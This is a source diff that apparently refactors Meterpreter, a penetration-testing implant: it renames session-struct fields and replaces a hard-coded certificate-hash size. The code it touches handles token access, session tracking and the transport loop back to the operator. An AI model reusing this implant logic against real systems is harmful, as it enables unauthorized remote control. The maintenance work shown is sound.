@@ -720,10 +720,10 @@ Transport* transport_create_http(BOOL ssl, wchar_t* url, wchar_t* ua, wchar_t* p
 	ctx->ssl = ssl;
 
 	// only apply the cert hash if we're given one and it's not the global value
-	if (certHash && strncmp((char*)certHash, "METERPRETER_SSL_CERT_HASH", 20) != 0)
+	if (certHash && strncmp((char*)certHash, "METERPRETER_SSL_CERT_HASH", CERT_HASH_SIZE) != 0)
 	{
-		ctx->cert_hash = (PBYTE)malloc(sizeof(BYTE) * 20);
-		memcpy(ctx->cert_hash, certHash, 20);
+		ctx->cert_hash = (PBYTE)malloc(sizeof(BYTE) * CERT_HASH_SIZE);
+		memcpy(ctx->cert_hash, certHash, CERT_HASH_SIZE);
 	}
 
 	transport->url = _wcsdup(url);
@@ -811,26 +811,26 @@ DWORD server_setup(SOCKET fd)
 			}
 
 			// Store our thread handle
-			pRemote->hServerThread = serverThread->handle;
+			pRemote->server_thread = serverThread->handle;
 
 			// Store our process token
-			if (!OpenThreadToken(pRemote->hServerThread, TOKEN_ALL_ACCESS, TRUE, &pRemote->hServerToken))
+			if (!OpenThreadToken(pRemote->server_thread, TOKEN_ALL_ACCESS, TRUE, &pRemote->server_token))
 			{
-				OpenProcessToken(GetCurrentProcess(), TOKEN_ALL_ACCESS, &pRemote->hServerToken);
+				OpenProcessToken(GetCurrentProcess(), TOKEN_ALL_ACCESS, &pRemote->server_token);
 			}
 
 			// Copy it to the thread token
-			pRemote->hThreadToken = pRemote->hServerToken;
+			pRemote->thread_token = pRemote->server_token;
 
 			// Save the initial session/station/desktop names...
-			pRemote->dwOrigSessionId = server_sessionid();
-			pRemote->dwCurrentSessionId = pRemote->dwOrigSessionId;
+			pRemote->orig_sess_id = server_sessionid();
+			pRemote->curr_sess_id = pRemote->orig_sess_id;
 			GetUserObjectInformation(GetProcessWindowStation(), UOI_NAME, &cStationName, 256, NULL);
-			pRemote->cpOrigStationName = _strdup(cStationName);
-			pRemote->cpCurrentStationName = _strdup(cStationName);
+			pRemote->orig_station_name = _strdup(cStationName);
+			pRemote->curr_station_name = _strdup(cStationName);
 			GetUserObjectInformation(GetThreadDesktop(GetCurrentThreadId()), UOI_NAME, &cDesktopName, 256, NULL);
-			pRemote->cpOrigDesktopName = _strdup(cDesktopName);
-			pRemote->cpCurrentDesktopName = _strdup(cDesktopName);
+			pRemote->orig_desktop_name = _strdup(cDesktopName);
+			pRemote->curr_desktop_name = _strdup(cDesktopName);
 
 			dprintf("[SERVER] Registering dispatch routines...");
 			register_dispatch_routines();
@@ -845,12 +845,12 @@ DWORD server_setup(SOCKET fd)
 
 			// allocate the "next transport" information
 			dprintf("[SERVER] creating transport");
-			pRemote->nextTransport = transport_create(global_meterpreter_transport + 12, global_meterpreter_url + (bStageless ? 1 : 0));
+			pRemote->next_transport = transport_create(global_meterpreter_transport + 12, global_meterpreter_url + (bStageless ? 1 : 0));
 
-			while (pRemote->nextTransport)
+			while (pRemote->next_transport)
 			{
-				pRemote->transport = pRemote->nextTransport;
-				pRemote->nextTransport = NULL;
+				pRemote->transport = pRemote->next_transport;
+				pRemote->next_transport = NULL;
 
 				dprintf("[SERVER] initialising transport 0x%p", pRemote->transport->transport_init);
 				if (pRemote->transport->transport_init && !pRemote->transport->transport_init(pRemote, fd))
